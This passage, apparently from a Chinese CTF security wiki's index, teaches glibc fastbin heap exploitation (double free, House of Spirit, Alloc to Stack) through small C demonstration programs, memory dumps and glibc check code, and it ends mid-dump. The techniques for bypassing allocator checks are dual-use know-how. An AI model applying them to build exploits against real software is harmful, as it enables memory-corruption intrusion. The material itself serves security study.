\u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d \u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a Fastbin Double Free House of Spirit Alloc to Stack Arbitrary Alloc \u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528 free \u51fd\u6570\u91ca\u653e**\u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk**\uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539 fd \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528 malloc \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002","title":"\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/fastbin/#_2","text":"fastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk \u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002 int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; chunk1 = malloc ( 0x30 ); chunk2 = malloc ( 0x30 ); chunk3 = malloc ( 0x30 ); //\u8fdb\u884c\u91ca\u653e free ( chunk1 ); free ( chunk2 ); free ( chunk3 ); return 0 ; } \u91ca\u653e\u524d 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000000000 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000602000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000602040 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011 \u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868 Fastbins[idx=2, size=0x30,ptr=0x602080] ===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)","title":"\u539f\u7406"},{"location":"Pwn/glibc-heap/fastbin/#fastbin-double-free","text":"","title":"Fastbin Double Free"},{"location":"Pwn/glibc-heap/fastbin/#_3","text":"Fastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6 (type confused) \u7684\u6548\u679c\u3002 Fastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0 fastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a fastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena \u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002 /* Another simple check: make sure the top of the bin is not the record we are going to add (i.e., double free). */ if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; }","title":"\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/fastbin/#_4","text":"\u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6 int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; chunk1 = malloc ( 0x10 ); chunk2 = malloc ( 0x10 ); free ( chunk1 ); free ( chunk1 ); return 0 ; } \u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002 *** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a] /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c] ./tst[0x4005a2] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830] ./tst[0x400499] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 02200000-02221000 rw-p 00000000 00:00 0 [heap] 7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0 [stack] 7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0 [vvar] 7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002 int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; chunk1 = malloc ( 0x10 ); chunk2 = malloc ( 0x10 ); free ( chunk1 ); free ( chunk2 ); free ( chunk1 ); return 0 ; } \u7b2c\u4e00\u6b21\u91ca\u653e free(chunk1) \u7b2c\u4e8c\u6b21\u91ca\u653e free(chunk2) \u7b2c\u4e09\u6b21\u91ca\u653e free(chunk1) \u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002 \u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena=>chunk1=>chun2=>chunk1 \u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002 typedef struct _chunk { long long pre_size ; long long size ; long long fd ; long long bk ; } CHUNK , * PCHUNK ; CHUNK bss_chunk ; int main ( void ) { void * chunk1 , * chunk2 , * chunk3 ; void * chunk_a , * chunk_b ; bss_chunk . size = 0x21 ; chunk1 = malloc ( 0x10 ); chunk2 = malloc ( 0x10 ); free ( chunk1 ); free ( chunk2 ); free ( chunk1 ); chunk_a = malloc ( 0x10 ); * ( long long * ) chunk_a =& bss_chunk ; malloc ( 0x10 ); malloc ( 0x10 ); chunk_b = malloc ( 0x10 ); printf ( \"%p\" , chunk_b ); return 0 ; } \u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8e bss \u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684 CHUNK bss_chunk Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x601080 <bss_chunk>: 0x0000000000000000 0x0000000000000021 0x601090 <bss_chunk+16>:0x0000000000000000 0x0000000000000000 0x6010a0: 0x0000000000000000 0x0000000000000000 0x6010b0: 0x0000000000000000 0x0000000000000000 0x6010c0: 0x0000000000000000 0x0000000000000000 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86 bss_chunk.size=0x21; \u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc \u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 *** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5] /lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651] /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184] ./tst[0x400636] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830] ./tst[0x4004e9] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 00bc4000-00be5000 rw-p 00000000 00:00 0 [heap] 7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0 [stack] 7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0 [vvar] 7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) _int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim )); return NULL ; }","title":"\u6f14\u793a"},{"location":"Pwn/glibc-heap/fastbin/#_5","text":"\u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002 \u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c (\u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1)\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"Pwn/glibc-heap/fastbin/#house-of-spirit","text":"\u3010\u6280\u672f\u5206\u4eab\u3011\u5806\u4e4bHouse of Spirit PWN\u5b66\u4e60\u4e4bhouse of\u7cfb\u5217(\u4e00)","title":"House Of Spirit"},{"location":"Pwn/glibc-heap/fastbin/#_6","text":"House of Spirit \u662f the Malloc Maleficarum \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d**\u6307\u5b9a\u5730\u5740**\u7684 chunk \u7684\u76ee\u7684\u3002 \u8981\u60f3\u6784\u9020 fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373 fake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a 1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002 fake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK fake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002 fake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e 2 * SIZE_SZ \uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e av->system_mem \u3002 fake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002","title":"\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/fastbin/#_7","text":"\u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates the house of spirit attack. \\n \" ); fprintf ( stderr , \"Calling malloc() once so that it sets up its memory. \\n \" ); malloc ( 1 ); fprintf ( stderr , \"We will now overwrite a pointer to point to a fake 'fastbin' region. \\n \" ); unsigned long long * a ; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks [ 10 ] __attribute__ (( aligned ( 16 ))); fprintf ( stderr , \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p. \\n \" , sizeof ( fake_chunks ), & fake_chunks [ 1 ], & fake_chunks [ 7 ]); fprintf ( stderr , \"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. \\n \" ); fprintf ( stderr , \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n \" ); fake_chunks [ 1 ] = 0x40 ; // this is the size fprintf ( stderr , \"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. \\n \" ); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks [ 9 ] = 0x1234 ; // nextsize fprintf ( stderr , \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p. \\n \" , & fake_chunks [ 1 ]); fprintf ( stderr , \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. \\n \" ); a = & fake_chunks [ 2 ]; fprintf ( stderr , \"Freeing the overwritten pointer. \\n \" ); free ( a ); fprintf ( stderr , \"Now the next malloc will return the region of our fake chunk at %p, which will be %p! \\n \" , & fake_chunks [ 1 ], & fake_chunks [ 2 ]); fprintf ( stderr , \"malloc(0x30): %p \\n \" , malloc ( 0x30 )); } \u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b \u279c how2heap git: ( master ) ./house_of_spirit This file demonstrates the house of spirit attack. Calling malloc () once so that it sets up its memory. We will now overwrite a pointer to point to a fake 'fastbin' region. This region ( memory of length: 80 ) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88. This chunk.size of this region has to be 16 more than the region ( to accomodate the chunk data ) while still falling into the fastbin category ( < = 128 on x64 ) . The PREV_INUSE ( lsb ) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED ( second lsb ) and NON_MAIN_ARENA ( third lsb ) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is > 2 *SIZE_SZ ( > 16 on x64 ) && < av->system_mem ( < 128kb by default for the main arena ) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58. ... note that the memory address of the *region* associated with this chunk must be 16 -byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60! malloc ( 0x30 ) : 0x7ffd9bceaa60","title":"\u6f14\u793a"},{"location":"Pwn/glibc-heap/fastbin/#_8","text":"\u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c \u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b \u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"Pwn/glibc-heap/fastbin/#alloc-to-stack","text":"","title":"Alloc to Stack"},{"location":"Pwn/glibc-heap/fastbin/#_9","text":"\u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002","title":"\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/fastbin/#_10","text":"\u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002 typedef struct _chunk { long long pre_size; long long size; long long fd; long long bk; } CHUNK,*PCHUNK; int main(void) { CHUNK stack_chunk; void *chunk1; void *chunk_a; stack_chunk.size=0x21; chunk1=malloc(0x10); free(chunk1); *(long long *)chunk1=&stack_chunk; malloc(0x10); chunk_a=malloc(0x10); return 0; } \u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x00007fffffffde60 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk \u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c 0x7ffff7dd1b20 <main_arena>: 0x0000000000000000 <=== unsorted bin 0x7ffff7dd1b28 <main_arena+8>: 0x00007fffffffde60 <=== fastbin[0] 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 \u6700\u7ec8\u7b2c\u4e8c\u6b21 malloc \u8fd4\u56de\u503c\u4e3a 0x00007fffffffde70 \u4e5f\u5c31\u662f stack_chunk 0x400629 <main+83> call 0x4004c0 <malloc@plt> \u2192 0x40062e <main+88> mov QWORD PTR [rbp-0x38], rax $rax : 0x00007fffffffde70 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 